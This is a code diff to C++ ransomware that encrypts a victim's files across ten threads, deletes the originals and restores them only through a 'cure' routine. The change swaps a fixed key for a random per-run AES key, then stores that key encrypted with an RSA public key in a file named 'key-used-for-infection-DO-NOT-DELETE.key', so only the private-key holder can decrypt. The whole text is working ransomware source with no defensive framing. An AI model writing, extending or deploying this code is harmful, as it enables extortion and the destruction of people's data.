@@ -87,7 +87,7 @@ static std::pair<std::vector<std::string>, std::vector<std::string>> getFilesToI
 	return {victimFilenames, infectedFilenames};
 }
 
-static void infect(const std::vector<std::string> vfs, const std::vector<std::string> ifs, int start, int end, bool isSilenced)
+static void infect(const std::vector<std::string> vfs, const std::vector<std::string> ifs, int start, int end, bool isSilenced, std::string infectionKey)
 {
 	for (int i = start; i < end; i++)
 	{
@@ -96,7 +96,7 @@ static void infect(const std::vector<std::string> vfs, const std::vector<std::st
 
 		try
 		{
-			encryptFile(vfs[i], ifs[i], INFECTION_KEY);
+			encryptFile(vfs[i], ifs[i], infectionKey);
 			std::filesystem::remove(vfs[i]);
 		}
 		catch(const std::exception& e)
@@ -129,13 +129,37 @@ static void cure(const std::vector<std::string> ifs, const std::vector<std::stri
 	}
 }
 
-void cureThreads(std::string medicine, bool isSilenced)
+void cureThreads(std::string privateKey, bool isSilenced)
 {
 	std::vector<std::thread> threads;
 
 	auto [infectedFilenames, curedFilenames] = getFilesToCure(isSilenced);
 	int numThreads = 10;
 	int jobSize = (infectedFilenames.size() + numThreads - 1) / numThreads;
+
+	std::ifstream file("key-used-for-infection-DO-NOT-DELETE.key", std::ios::binary);
+	if (!file)
+	{
+		std::cerr << "File error" << std::endl;
+		exit(1);
+	}
+
+	std::vector<unsigned char> data{std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>{}};
+	file.close();
+
+	std::string medicine = "";
+	try
+	{
+		medicine = decryptRSA(data, privateKey);
+		if (medicine.empty())
+			throw std::runtime_error("Empty medicine");
+	}
+	catch(const std::exception& e)
+	{
+		if (!isSilenced)
+			std::cerr << "Curing error while decrypting RSA: " << e.what() << std::endl;
+		exit(1);
+	}
 
 	for (int i = 0; i < numThreads; i++)
 	{
@@ -169,6 +193,30 @@ void infectThreads(bool isSilenced)
 	int numThreads = 10;
 	int jobSize = (victimFilenames.size() + numThreads - 1) / numThreads;
 
+	std::array<unsigned char, 32> generatedKey;
+	try
+	{
+		generatedKey = generateEncryptionKey();
+	}
+	catch(const std::exception& e)
+	{
+		if (!isSilenced)
+			std::cerr << "Generation of AES key error: " << e.what() << std::endl;
+		exit(1);
+	}
+
+	std::stringstream ss;
+
+	for (unsigned char byte : generatedKey)
+	{
+		ss << std::hex
+		<< std::setw(2)
+		<< std::setfill('0')
+		<< static_cast<int>(byte);
+	}
+
+	std::string infectionKey = ss.str();
+
 	for (int i = 0; i < numThreads; i++)
 	{
 		int start = i * jobSize;
@@ -179,7 +227,7 @@ void infectThreads(bool isSilenced)
 
 		try
 		{
-			threads.emplace_back(infect, victimFilenames, infectedFilenames, start, end, isSilenced);
+			threads.emplace_back(infect, victimFilenames, infectedFilenames, start, end, isSilenced, infectionKey);
 		}
 		catch(const std::exception& e)
 		{
@@ -191,4 +239,23 @@ void infectThreads(bool isSilenced)
 
 	for (auto& th : threads)
 		th.join();
+
+	std::ofstream file("key-used-for-infection-DO-NOT-DELETE.key");
+	if (!file)
+	{
+		std::cerr << "File error" << std::endl;
+		exit(1);
+	}
+
+	try
+	{
+		std::vector<unsigned char> encryptedRSAKey = encryptRSA(infectionKey, "./public.pem");
+		file.write(reinterpret_cast<const char*>(encryptedRSAKey.data()), encryptedRSAKey.size());
+		file.close();
+	}
+	catch(const std::exception& e)
+	{
+		if (!isSilenced)
+			std::cerr << "Encrypt RSA error: " << e.what() << std::endl;
+	}
 }
